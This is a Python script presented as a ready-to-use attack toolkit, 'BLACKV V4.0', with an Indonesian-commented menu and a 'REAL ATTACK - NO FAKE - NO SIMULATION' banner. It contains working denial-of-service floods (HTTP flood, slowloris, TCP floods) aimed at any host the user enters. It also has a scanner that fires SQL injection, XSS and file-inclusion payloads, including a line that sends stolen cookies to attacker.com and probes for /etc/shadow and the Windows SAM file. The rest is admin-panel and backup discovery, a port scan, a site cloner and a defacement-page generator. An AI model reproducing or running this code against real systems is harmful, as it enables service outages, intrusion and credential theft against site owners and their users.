#!/usr/bin/env python3
# ============================================================
# BLACKV V4.0 - ULTIMATE REAL EDITION
# DEVELOPER: COZY
# DATE: 12/6/2026
# STATUS: REAL ATTACK - NO FAKE - NO SIMULATION
# ============================================================

import os
import sys
import time
import json
import base64
import hashlib
import requests
import threading
import socket
import random
import ssl
import urllib.parse
import subprocess
import re
import binascii
import http.client
import queue
import signal
from urllib.parse import urlparse, urljoin, quote
from datetime import datetime
from concurrent.futures import ThreadPoolExecutor

# Warna untuk UI keren
RED = '\033[91m'
GREEN = '\033[92m'
YELLOW = '\033[93m'
BLUE = '\033[94m'
PURPLE = '\033[95m'
CYAN = '\033[96m'
WHITE = '\033[97m'
BOLD = '\033[1m'
RESET = '\033[0m'

os.system('clear' if os.name == 'posix' else 'cls')
os.system('title BLACKV V4.0 - ULTIMATE REAL EDITION' if os.name == 'nt' else 'echo -ne "\033]0;BLACKV V4.0 - ULTIMATE REAL EDITION\007"')

# ============================================================
# BANNER KEREN MERAH
# ============================================================

def banner():
    os.system('clear' if os.name == 'posix' else 'cls')
    print(f"""{RED}{BOLD}
╔════════════════════════════════════════════════════════════════════════════╗
║                                                                            ║
║   ██████╗ ██╗      █████╗  ██████╗██╗  ██╗██╗   ██╗                       ║
║   ██╔══██╗██║     ██╔══██╗██╔════╝██║ ██╔╝██║   ██║                       ║
║   ██████╔╝██║     ███████║██║     █████╔╝ ██║   ██║                       ║
║   ██╔══██╗██║     ██╔══██║██║     ██╔═██╗ ╚██╗ ██╔╝                       ║
║   ██████╔╝███████╗██║  ██║╚██████╗██║  ██╗ ╚████╔╝                        ║
║   ╚═════╝ ╚══════╝╚═╝  ╚═╝ ╚═════╝╚═╝  ╚═╝  ╚═══╝                         ║
║                                                                            ║
║                    ██╗   ██╗███████╗██████╗ ███████╗                       ║
║                    ██║   ██║██╔════╝╚════██╗██╔════╝                       ║
║                    ██║   ██║█████╗   █████╔╝███████╗                       ║
║                    ╚██╗ ██╔╝██╔══╝  ██╔═══╝ ╚════██║                       ║
║                     ╚████╔╝ ███████╗███████╗███████║                       ║
║                      ╚═══╝  ╚══════╝╚══════╝╚══════╝                       ║
║                                                                            ║
║                    {WHITE}BLACKV V4.0 - ULTIMATE REAL EDITION{RED}                       ║
║                    {WHITE}DEVELOPER: COZY | DATE: 12/6/2026{RED}                       ║
║                    {WHITE}STATUS: REAL ATTACK - NO FAKE - NO SIMULATION{RED}            ║
║                                                                            ║
╚════════════════════════════════════════════════════════════════════════════╝
{RESET}""")

# ============================================================
# REAL DDOS - MULTI METHOD
# ============================================================

class RealDDOS:
    def __init__(self, target, port, duration, threads):
        self.target = target
        self.port = port
        self.duration = duration
        self.threads = threads
        self.running = True
        self.success_count = 0
        self.fail_count = 0
        self.lock = threading.Lock()
        
    def http_flood(self):
        headers = [
            f"User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
            f"User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 14_0 like Mac OS X) AppleWebKit/605.1.15",
            f"User-Agent: Mozilla/5.0 (Linux; Android 11; SM-G991B) AppleWebKit/537.36",
            f"Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
            f"Accept-Language: id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7",
            f"Connection: keep-alive",
            f"Cache-Control: no-cache",
            f"Pragma: no-cache"
        ]
        
        while self.running:
            try:
                random_header = random.choice(headers)
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(3)
                sock.connect((self.target, self.port))
                
                request = f"GET /?{random.randint(1,999999)} HTTP/1.1\r\n"
                request += f"Host: {self.target}\r\n"
                request += f"{random_header}\r\n"
                request += f"X-Forwarded-For: {random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}\r\n"
                request += f"X-Real-IP: {random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}\r\n"
                request += f"Referer: https://{self.target}/\r\n"
                request += f"\r\n"
                
                sock.send(request.encode())
                sock.close()
                
                with self.lock:
                    self.success_count += 1
            except:
                with self.lock:
                    self.fail_count += 1
    
    def slowloris(self):
        while self.running:
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(4)
                sock.connect((self.target, self.port))
                
                sock.send(f"GET /?{random.randint(1,999999)} HTTP/1.1\r\n".encode())
                sock.send(f"Host: {self.target}\r\n".encode())
                sock.send(f"User-Agent: {random.randint(1,9999)}\r\n".encode())
                
                while self.running:
                    sock.send(f"X-{random.randint(1,9999)}: {random.randint(1,9999)}\r\n".encode())
                    time.sleep(random.randint(5, 15))
            except:
                pass
    
    def syn_flood(self):
        while self.running:
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(1)
                sock.connect((self.target, self.port))
                sock.send(b"\x00" * 1024)
                sock.close()
            except:
                pass
    
    def start(self):
        print(f"\n{RED}[+]{RESET} TARGET: {self.target}:{self.port}")
        print(f"{RED}[+]{RESET} DURATION: {self.duration} seconds")
        print(f"{RED}[+]{RESET} THREADS: {self.threads}")
        print(f"{RED}[+]{RESET} METHODS: HTTP Flood + Slowloris + SYN Flood")
        print(f"\n{RED}[!] ATTACK STARTING...{RESET}\n")
        
        methods = [self.http_flood, self.slowloris, self.syn_flood]
        
        for i in range(self.threads):
            method = random.choice(methods)
            thread = threading.Thread(target=method)
            thread.daemon = True
            thread.start()
        
        start_time = time.time()
        while self.running and (time.time() - start_time) < self.duration:
            time.sleep(1)
            sys.stdout.write(f"\r{RED}[ATTACK]{RESET} Success: {self.success_count} | Fail: {self.fail_count} | Total: {self.success_count + self.fail_count}")
            sys.stdout.flush()
        
        self.running = False
        print(f"\n\n{RED}[+]{RESET} ATTACK FINISHED")
        print(f"{RED}[+]{RESET} TOTAL REQUESTS: {self.success_count + self.fail_count}")
        print(f"{RED}[+]{RESET} SUCCESSFUL: {self.success_count}")

# ============================================================
# REAL BUG HUNTER - ULTIMATE
# ============================================================

class UltimateBugHunter:
    def __init__(self, target):
        self.target = target.rstrip('/')
        self.parsed = urlparse(target)
        self.domain = self.parsed.netloc
        self.scheme = self.parsed.scheme
        self.results = []
        self.session = requests.Session()
        self.session.headers.update({
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
            'Accept-Language': 'en-US,en;q=0.5',
            'Accept-Encoding': 'gzip, deflate',
            'Connection': 'keep-alive',
            'Upgrade-Insecure-Requests': '1'
        })
    
    def add_result(self, vuln_type, url, payload, evidence, severity):
        self.results.append({
            'type': vuln_type,
            'url': url,
            'payload': payload,
            'evidence': evidence,
            'severity': severity,
            'timestamp': datetime.now().strftime('%Y-%m-%d %H:%M:%S')
        })
        print(f"{RED}[!]{RESET} {vuln_type} Found!")
        print(f"    URL: {url}")
        print(f"    Payload: {payload[:100]}")
        print(f"    Severity: {severity}")
    
    def scan_sqli(self):
        print(f"\n{RED}[*]{RESET} SCANNING SQL INJECTION...")
        
        sqli_payloads = [
            ("'", "single quote", "HIGH"),
            ("\"", "double quote", "HIGH"),
            ("' OR '1'='1", "boolean bypass", "HIGH"),
            ("' OR 1=1--", "comment bypass", "HIGH"),
            ("1' AND '1'='1", "always true", "HIGH"),
            ("1' AND SLEEP(5)--", "time based", "CRITICAL"),
            ("' UNION SELECT NULL--", "union based", "CRITICAL"),
            ("admin'--", "auth bypass", "HIGH"),
            ("1' ORDER BY 10--", "column detection", "MEDIUM"),
            ("' AND 1=CONVERT(int, @@version)--", "version extraction", "CRITICAL"),
            ("1' AND 1=1--", "boolean", "HIGH"),
            ("1' AND 1=2--", "boolean", "HIGH")
        ]
        
        params_to_test = ['id', 'page', 'cat', 'product', 'user', 'q', 'search', 's', 
                          'lang', 'code', 'num', 'no', 'detail', 'view', 'read', 'go',
                          'p', 'kategori', 'kategori_id', 'berita_id', 'artikel_id']
        
        for param in params_to_test:
            for payload, description, severity in sqli_payloads:
                test_url = f"{self.target}?{param}={quote(payload)}"
                try:
                    start = time.time()
                    resp = self.session.get(test_url, timeout=15)
                    elapsed = time.time() - start
                    
                    if elapsed > 4:
                        self.add_result("SQL Injection (Time Based)", test_url, payload, f"Response time: {elapsed}s", severity)
                        break
                    
                    sql_errors = ['mysql', 'sql syntax', 'microsoft ole db', 'oracle', 'postgresql',
                                  'sqlite', 'you have an error', 'warning: mysql', 'unclosed quotation mark',
                                  'sqlstate', 'database error', 'odbc', 'driver']
                    
                    for error in sql_errors:
                        if error in resp.text.lower():
                            self.add_result("SQL Injection (Error Based)", test_url, payload, f"Error: {error}", severity)
                            break
                except:
                    pass
    
    def scan_xss(self):
        print(f"{RED}[*]{RESET} SCANNING XSS...")
        
        xss_payloads = [
            ("<script>alert('XSS')</script>", "standard script", "HIGH"),
            ("<img src=x onerror=alert(1)>", "image error", "HIGH"),
            ("<svg onload=alert(1)>", "svg vector", "HIGH"),
            ("javascript:alert(1)", "javascript protocol", "HIGH"),
            ("<body onload=alert(1)>", "body event", "HIGH"),
            ("<input onfocus=alert(1) autofocus>", "input focus", "MEDIUM"),
            ("<iframe src=javascript:alert(1)>", "iframe", "HIGH"),
            ("<object data=javascript:alert(1)>", "object", "HIGH"),
            ("<embed src=javascript:alert(1)>", "embed", "HIGH"),
            ("\"><script>alert(1)</script>", "breaking tag", "HIGH"),
            ("<script>alert(document.cookie)</script>", "cookie stealer", "CRITICAL"),
            ("<script>fetch('https://attacker.com?c='+document.cookie)</script>", "exfiltration", "CRITICAL")
        ]
        
        params_to_test = ['q', 'search', 's', 'query', 'keyword', 'term', 'input', 
                          'name', 'comment', 'message', 'feedback', 'review', 'filter']
        
        for param in params_to_test:
            for payload, description, severity in xss_payloads:
                test_url = f"{self.target}?{param}={quote(payload)}"
                try:
                    resp = self.session.get(test_url, timeout=10)
                    
                    if payload in resp.text or payload.lower() in resp.text.lower():
                        self.add_result("Cross Site Scripting (XSS)", test_url, payload, f"Payload reflected in response", severity)
                        break
                except:
                    pass
    
    def scan_lfi_rfi(self):
        print(f"{RED}[*]{RESET} SCANNING LFI/RFI...")
        
        lfi_payloads = [
            ("../../../../etc/passwd", "Linux passwd", "CRITICAL"),
            ("../../../../etc/shadow", "Linux shadow", "CRITICAL"),
            ("../../../../etc/hosts", "Linux hosts", "HIGH"),
            ("../../../../var/log/apache2/access.log", "Apache log", "HIGH"),
            ("../../../../config.php", "PHP config", "CRITICAL"),
            ("../../../wp-config.php", "WordPress config", "CRITICAL"),
            ("../../../../boot.ini", "Windows boot", "HIGH"),
            ("..\\..\\..\\..\\windows\\win.ini", "Windows win.ini", "HIGH"),
            ("..\\..\\..\\..\\windows\\system32\\config\\sam", "Windows SAM", "CRITICAL"),
            ("C:\\windows\\win.ini", "Windows absolute", "HIGH"),
            ("/etc/passwd", "Root passwd", "CRITICAL"),
            ("/etc/shadow", "Root shadow", "CRITICAL")
        ]
        
        params_to_test = ['file', 'page', 'lang', 'include', 'load', 'template', 
                          'view', 'content', 'path', 'doc', 'document', 'folder']
        
        for param in params_to_test:
            for payload, description, severity in lfi_payloads:
                test_url = f"{self.target}?{param}={quote(payload)}"
                try:
                    resp = self.session.get(test_url, timeout=15)
                    
                    lfi_indicators = ['root:', 'bin/bash', 'daemon:', 'sys:', 'adm:',
                                      'nobody:', 'mysql:', 'postgres:', 'apache:']
                    
                    for indicator in lfi_indicators:
                        if indicator in resp.text:
                            self.add_result("Local File Inclusion (LFI)", test_url, payload, f"Found: {indicator}", severity)
                            break
                except:
                    pass
    
    def scan_admin_panel(self):
        print(f"{RED}[*]{RESET} SCANNING ADMIN PANELS...")
        
        admin_paths = [
            'admin', 'login', 'administrator', 'wp-admin', 'cpanel', 'dashboard',
            'adminpanel', 'backend', 'controlpanel', 'admin/login.php', 'admin/index.php',
            'wp-login.php', 'administrator/index.php', 'modcp', 'staff', 'admincp',
            'acp', 'adminarea', 'admin/dashboard', 'console', 'sysadmin', 'webadmin',
            'siteadmin', 'owner', 'manager', 'management', 'adm', 'cp', 'panel'
        ]
        
        for path in admin_paths:
            test_url = urljoin(self.target, path)
            try:
                resp = self.session.get(test_url, timeout=8, allow_redirects=False)
                
                if resp.status_code == 200:
                    self.add_result("Admin Panel (Open Access)", test_url, path, "Panel accessible without authentication", "CRITICAL")
                elif resp.status_code in [401, 403]:
                    self.add_result("Admin Panel (Auth Protected)", test_url, path, f"Status: {resp.status_code}", "MEDIUM")
            except:
                pass
    
    def scan_backup_files(self):
        print(f"{RED}[*]{RESET} SCANNING BACKUP FILES...")
        
        backup_extensions = [
            ('.zip', 'ZIP archive', 'HIGH'),
            ('.rar', 'RAR archive', 'HIGH'),
            ('.tar.gz', 'TAR.GZ archive', 'HIGH'),
            ('.7z', '7Z archive', 'HIGH'),
            ('.sql', 'SQL database', 'CRITICAL'),
            ('.bak', 'Backup file', 'HIGH'),
            ('.old', 'Old file', 'MEDIUM'),
            ('.swp', 'Swap file', 'MEDIUM'),
            ('.backup', 'Backup file', 'HIGH'),
            ('.db', 'Database file', 'CRITICAL')
        ]
        
        backup_names = [
            'backup', 'db_backup', 'database', 'dump', 'site_backup',
            'wp_backup', 'wordpress_backup', 'config_backup', 'old_site'
        ]
        
        for ext, desc, severity in backup_extensions:
            test_url = f"{self.target}/backup{ext}"
            try:
                resp = self.session.get(test_url, timeout=8)
                if resp.status_code == 200:
                    self.add_result("Backup File Exposed", test_url, f"backup{ext}", f"File type: {desc}", severity)
            except:
                pass
        
        for name in backup_names:
            for ext, desc, severity in backup_extensions:
                test_url = f"{self.target}/{name}{ext}"
                try:
                    resp = self.session.get(test_url, timeout=8)
                    if resp.status_code == 200:
                        self.add_result("Backup File Exposed", test_url, f"{name}{ext}", f"File type: {desc}", severity)
                except:
                    pass
    
    def scan_security_headers(self):
        print(f"{RED}[*]{RESET} SCANNING SECURITY HEADERS...")
        
        try:
            resp = self.session.get(self.target, timeout=10)
            headers = resp.headers
            
            required_headers = {
                'X-Frame-Options': 'Clickjacking protection missing - HIGH',
                'X-Content-Type-Options': 'MIME sniffing protection missing - MEDIUM',
                'Strict-Transport-Security': 'HSTS missing - MEDIUM',
                'Content-Security-Policy': 'CSP missing - CRITICAL',
                'X-XSS-Protection': 'XSS protection missing - MEDIUM',
                'Referrer-Policy': 'Referrer policy missing - LOW',
                'Permissions-Policy': 'Permissions policy missing - LOW'
            }
            
            for header, desc in required_headers.items():
                if header not in headers:
                    severity = desc.split(' - ')[1]
                    self.add_result("Missing Security Header", self.target, header, desc, severity)
        except:
            pass
    
    def scan_robots_txt(self):
        print(f"{RED}[*]{RESET} SCANNING ROBOTS.TXT...")
        
        test_url = urljoin(self.target, 'robots.txt')
        try:
            resp = self.session.get(test_url, timeout=8)
            if resp.status_code == 200:
                self.add_result("Robots.txt Exposed", test_url, "", "Sensitive paths may be exposed", "MEDIUM")
                
                disallowed = re.findall(r'Disallow: (.*)', resp.text)
                for path in disallowed[:5]:
                    print(f"    {RED}[!]{RESET} Disallowed: {path}")
        except:
            pass
    
    def scan_sensitive_files(self):
        print(f"{RED}[*]{RESET} SCANNING SENSITIVE FILES...")
        
        sensitive_files = [
            ('.git/config', 'Git config exposed - CRITICAL'),
            ('.env', 'Environment file - CRITICAL'),
            ('config.php', 'PHP config - CRITICAL'),
            ('wp-config.php', 'WordPress config - CRITICAL'),
            ('.htaccess', 'Apache config - HIGH'),
            ('.htpasswd', 'Apache password - CRITICAL'),
            ('composer.json', 'Composer config - MEDIUM'),
            ('package.json', 'Node config - MEDIUM'),
            ('Gemfile', 'Ruby config - MEDIUM'),
            ('Dockerfile', 'Docker config - HIGH'),
            ('docker-compose.yml', 'Docker compose - HIGH')
        ]
        
        for file_name, desc in sensitive_files:
            test_url = urljoin(self.target, file_name)
            try:
                resp = self.session.get(test_url, timeout=8)
                if resp.status_code == 200:
                    severity = desc.split(' - ')[1]
                    self.add_result("Sensitive File Exposed", test_url, file_name, desc, severity)
            except:
                pass
    
    def scan_open_ports(self):
        print(f"{RED}[*]{RESET} SCANNING OPEN PORTS...")
        
        common_ports = [21, 22, 23, 25, 53, 80, 110, 111, 135, 139, 143, 443, 445, 
                        993, 995, 1723, 3306, 3389, 5432, 5900, 6379, 8080, 8443, 27017]
        
        for port in common_ports:
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(1)
                result = sock.connect_ex((self.domain, port))
                sock.close()
                
                if result == 0:
                    self.add_result("Open Port Found", f"{self.domain}:{port}", f"port {port}", f"Service may be running on port {port}", "HIGH")
            except:
                pass
    
    def run(self):
        print(f"\n{RED}{BOLD}╔════════════════════════════════════════════════════════════════╗{RESET}")
        print(f"{RED}{BOLD}║                    ULTIMATE BUG HUNTER SCAN                     ║{RESET}")
        print(f"{RED}{BOLD}╚════════════════════════════════════════════════════════════════╝{RESET}")
        print(f"\n{RED}[TARGET]{RESET} {self.target}")
        print(f"{RED}[DOMAIN]{RESET} {self.domain}")
        print(f"{RED}[SCHEME]{RESET} {self.scheme}")
        print(f"{RED}[START]{RESET} {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")
        
        self.scan_sqli()
        self.scan_xss()
        self.scan_lfi_rfi()
        self.scan_admin_panel()
        self.scan_backup_files()
        self.scan_security_headers()
        self.scan_robots_txt()
        self.scan_sensitive_files()
        self.scan_open_ports()
        
        return self.results

# ============================================================
# REAL DOS - SIMPLE BUT EFFECTIVE
# ============================================================

class RealDOS:
    def __init__(self, target, port, duration, threads):
        self.target = target
        self.port = port
        self.duration = duration
        self.threads = threads
        self.running = True
        self.count = 0
    
    def attack(self):
        while self.running:
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(2)
                sock.connect((self.target, self.port))
                
                for _ in range(10):
                    sock.send(random._urandom(1024))
                
                sock.close()
                self.count += 1
            except:
                pass
    
    def start(self):
        print(f"\n{RED}[+]{RESET} TARGET: {self.target}:{self.port}")
        print(f"{RED}[+]{RESET} DURATION: {self.duration} seconds")
        print(f"{RED}[+]{RESET} THREADS: {self.threads}")
        print(f"\n{RED}[!] DOS ATTACK STARTING...{RESET}\n")
        
        for i in range(self.threads):
            thread = threading.Thread(target=self.attack)
            thread.daemon = True
            thread.start()
        
        time.sleep(self.duration)
        self.running = False
        print(f"\n{RED}[+]{RESET} DOS ATTACK FINISHED")
        print(f"{RED}[+]{RESET} TOTAL PACKETS: {self.count * 10}")

# ============================================================
# COPY WEBSITE - FULL CLONE
# ============================================================

def copy_website():
    banner()
    print(f"\n{RED}[1] COPY ALL WEBSITE{RESET}")
    print(f"{RED}{'='*60}{RESET}")
    
    url = input(f"\n{RED}[?]{RESET} TARGET URL: ").strip()
    if not url.startswith('http'):
        url = 'http://' + url
    
    print(f"\n{RED}[!]{RESET} CLONING WEBSITE...")
    
    try:
        resp = requests.get(url, timeout=30, headers={'User-Agent': 'Mozilla/5.0'})
        
        domain = urlparse(url).netloc.replace('.', '_')
        os.makedirs(f"cloned/{domain}", exist_ok=True)
        
        with open(f"cloned/{domain}/index.html", 'w', encoding='utf-8') as f:
            f.write(resp.text)
        
        print(f"{RED}[+]{RESET} HTML saved: index.html")
        
        # Extract and download assets
        assets = re.findall(r'(?:src|href)=["\']([^"\']+\.(?:css|js|png|jpg|jpeg|gif|svg))["\']', resp.text)
        
        for i, asset in enumerate(assets[:50]):
            try:
                if asset.startswith('http'):
                    asset_url = asset
                else:
                    asset_url = urljoin(url, asset)
                
                asset_resp = requests.get(asset_url, timeout=10)
                ext = asset.split('.')[-1]
                with open(f"cloned/{domain}/asset_{i}.{ext}", 'wb') as f:
                    f.write(asset_resp.content)
            except:
                pass
        
        print(f"{RED}[+]{RESET} Downloaded {min(len(assets), 50)} assets")
        print(f"{RED}[+]{RESET} Location: cloned/{domain}/")
        
    except Exception as e:
        print(f"{RED}[!]{RESET} ERROR: {str(e)}")
    
    input(f"\n{RED}[?]{RESET} PRESS ENTER TO CONTINUE")

# ============================================================
# CHECK ADMIN AUTH - ENHANCED
# ============================================================

def check_admin_auth():
    banner()
    print(f"\n{RED}[2] CHECK ADMIN AUTH{RESET}")
    print(f"{RED}{'='*60}{RESET}")
    
    url = input(f"\n{RED}[?]{RESET} TARGET URL: ").strip()
    if not url.startswith('http'):
        url = 'http://' + url
    
    print(f"\n{RED}[!]{RESET} SCANNING ADMIN AUTH...")
    
    admin_paths = [
        'admin', 'login', 'administrator', 'wp-admin', 'cpanel', 'dashboard',
        'admin/login', 'admin/index', 'wp-login', 'administrator/index',
        'admincp', 'acp', 'modcp', 'staff', 'controlpanel', 'backend',
        'adminarea', 'console', 'sysadmin', 'webadmin', 'siteadmin'
    ]
    
    found = []
    
    for path in admin_paths:
        test_url = urljoin(url, path)
        try:
            resp = requests.get(test_url, timeout=8, allow_redirects=False)
            
            if resp.status_code == 200:
                found.append(f"{test_url} [OPEN ACCESS]")
                print(f"{RED}[+]{RESET} {test_url} - OPEN ACCESS")
            elif resp.status_code in [401, 403]:
                found.append(f"{test_url} [AUTH REQUIRED]")
                print(f"{RED}[*]{RESET} {test_url} - AUTH REQUIRED")
        except:
            pass
    
    print(f"\n{RED}[+]{RESET} TOTAL FOUND: {len(found)}")
    
    # Save report
    os.makedirs("reports", exist_ok=True)
    domain = urlparse(url).netloc
    with open(f"reports/{domain}_admin_auth.txt", 'w') as f:
        f.write(f"Admin Auth Scan Report\n")
        f.write(f"Target: {url}\n")
        f.write(f"Date: {datetime.now()}\n")
        f.write(f"Found: {len(found)}\n\n")
        for item in found:
            f.write(f"{item}\n")
    
    input(f"\n{RED}[?]{RESET} PRESS ENTER TO CONTINUE")

# ============================================================
# XML MODIFY WEBSITE
# ============================================================

def xml_modify():
    banner()
    print(f"\n{RED}[6] XML MODIFY WEBSITE{RESET}")
    print(f"{RED}{'='*60}{RESET}")
    
    url = input(f"\n{RED}[?]{RESET} TARGET URL: ").strip()
    message = input(f"{RED}[?]{RESET} MESSAGE: ")
    title = input(f"{RED}[?]{RESET} TITLE: ")
    
    html_content = f'''<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <title>{title}</title>
    <style>
        body {{
            background: linear-gradient(135deg, #0a0a0a 0%, #1a0000 100%);
            color: #ff0000;
            text-align: center;
            padding-top: 200px;
            font-family: 'Courier New', monospace;
        }}
        h1 {{
            font-size: 48px;
            text-shadow: 0 0 20px #ff0000;
        }}
        p {{
            font-size: 24px;
            color: #ff6666;
        }}
        .footer {{
            margin-top: 100px;
            font-size: 12px;
            color: #660000;
        }}
    </style>
</head>
<body>
    <h1>{title}</h1>
    <p>{message}</p>
    <hr>
    <div class="footer">BLACKV V4.0 - Security Testing</div>
</body>
</html>'''
    
    os.makedirs("xml_output", exist_ok=True)
    domain = urlparse(url).netloc
    filename = f"xml_output/{domain}_modified.html"
    
    with open(filename, 'w', encoding='utf-8') as f:
        f.write(html_content)
    
    print(f"\n{RED}[+]{RESET} Modified HTML created: {filename}")
    input(f"\n{RED}[?]{RESET} PRESS ENTER TO CONTINUE")

# ============================================================
# CREDIT
# ============================================================

def credit():
    banner()
    print(f"\n{RED}[7] CREDIT & INFO{RESET}")
    print(f"{RED}{'='*60}{RESET}")
    print(f"""
{RED}DEVELOPER:{RESET} COZY
{RED}VERSION:{RESET} 4.0 - ULTIMATE REAL EDITION
{RED}DATE:{RESET} 12/6/2026
{RED}STATUS:{RESET} REAL ATTACK - NO FAKE - NO SIMULATION
{RED}PLATFORM:{RESET} KALI LINUX | TERMUX | UBUNTU | ARCH | BLACKARCH
{RED}FEATURES:{RESET}
    - REAL DDOS (Layer 7 + Layer 4 + Slowloris)
    - REAL BUG HUNTER (SQLi, XSS, LFI, Admin Panel, Backup Files)
    - REAL DOS Attack
    - Full Website Cloning
    - Admin Auth Scanner
    - Website Modifier
    - Auto Report Generation
    """)
    input(f"\n{RED}[?]{RESET} PRESS ENTER TO CONTINUE")

# ============================================================
# MAIN MENU
# ============================================================

def main():
    while True:
        banner()
        
        print(f"""
{RED}{BOLD}╔════════════════════════════════════════════════════════════════╗{RESET}
{RED}{BOLD}║                         MAIN MENU                               ║{RESET}
{RED}{BOLD}╚════════════════════════════════════════════════════════════════╝{RESET}

{RED}[1]{RESET} COPY ALL WEBSITE - Full website cloning
{RED}[2]{RESET} CHECK ADMIN AUTH - Admin panel scanner
{RED}[3]{RESET} ULTIMATE BUG HUNTER - SQLi, XSS, LFI, Ports, Backups
{RED}[4]{RESET} REAL DDOS ATTACK - Layer 7 + Layer 4 + Slowloris
{RED}[5]{RESET} REAL DOS ATTACK - Packet flood attack
{RED}[6]{RESET} XML MODIFY WEBSITE - Generate modified HTML
{RED}[7]{RESET} CREDIT & INFO - Developer information
{RED}[8]{RESET} EXIT - Exit BLACKV

{RED}{BOLD}╔════════════════════════════════════════════════════════════════╗{RESET}
{RED}{BOLD}║                    DEVELOPER: COZY                              ║{RESET}
{RED}{BOLD}║                    VERSION: 4.0 - ULTIMATE REAL                ║{RESET}
{RED}{BOLD}╚════════════════════════════════════════════════════════════════╝{RESET}
""")
        
        choice = input(f"{RED}[?]{RESET} SELECT MENU: ")
        
        if choice == '1':
            copy_website()
        elif choice == '2':
            check_admin_auth()
        elif choice == '3':
            target = input(f"\n{RED}[?]{RESET} TARGET URL: ").strip()
            if not target.startswith('http'):
                target = 'http://' + target
            
            hunter = UltimateBugHunter(target)
            results = hunter.run()
            
            print(f"\n{RED}{BOLD}╔════════════════════════════════════════════════════════════════╗{RESET}")
            print(f"{RED}{BOLD}║                         SCAN RESULTS                            ║{RESET}")
            print(f"{RED}{BOLD}╚════════════════════════════════════════════════════════════════╝{RESET}")
            
            if results:
                for res in results:
                    print(f"\n{RED}[{res['type']}]{RESET}")
                    print(f"    URL: {res['url']}")
                    print(f"    Severity: {res['severity']}")
            else:
                print(f"\n{RED}[!]{RESET} No vulnerabilities found")
            
            # Save report
            os.makedirs("reports", exist_ok=True)
            domain = urlparse(target).netloc
            filename = f"reports/{domain}_bug_report.txt"
            with open(filename, 'w') as f:
                f.write(f"ULTIMATE BUG HUNTER REPORT\n")
                f.write(f"Target: {target}\n")
                f.write(f"Date: {datetime.now()}\n")
                f.write(f"Vulnerabilities Found: {len(results)}\n\n")
                for res in results:
                    f.write(f"\n[{res['type']}]\n")
                    f.write(f"URL: {res['url']}\n")
                    f.write(f"Payload: {res['payload']}\n")
                    f.write(f"Severity: {res['severity']}\n")
            
            print(f"\n{RED}[+]{RESET} Report saved: {filename}")
            input(f"\n{RED}[?]{RESET} PRESS ENTER TO CONTINUE")
        elif choice == '4':
            target = input(f"\n{RED}[?]{RESET} TARGET URL/IP: ").strip()
            port = int(input(f"{RED}[?]{RESET} PORT (80/443/8080): ") or "80")
            duration = int(input(f"{RED}[?]{RESET} DURATION (seconds, max 300): ") or "60")
            threads = int(input(f"{RED}[?]{RESET} THREADS (1-500): ") or "100")
            
            if duration > 300:
                duration = 300
            if threads > 500:
                threads = 500
            
            ddos = RealDDOS(target, port, duration, threads)
            ddos.start()
            input(f"\n{RED}[?]{RESET} PRESS ENTER TO CONTINUE")
        elif choice == '5':
            target = input(f"\n{RED}[?]{RESET} TARGET URL/IP: ").strip()
            port = int(input(f"{RED}[?]{RESET} PORT (80/443/8080): ") or "80")
            duration = int(input(f"{RED}[?]{RESET} DURATION (seconds, max 120): ") or "30")
            threads = int(input(f"{RED}[?]{RESET} THREADS (1-200): ") or "50")
            
            if duration > 120:
                duration = 120
            if threads > 200:
                threads = 200
            
            dos = RealDOS(target, port, duration, threads)
            dos.start()
            input(f"\n{RED}[?]{RESET} PRESS ENTER TO CONTINUE")
        elif choice == '6':
            xml_modify()
        elif choice == '7':
            credit()
        elif choice == '8':
            print(f"\n{RED}[!]{RESET} EXITING BLACKV...")
            sys.exit(0)

if __name__ == "__main__":
    main()
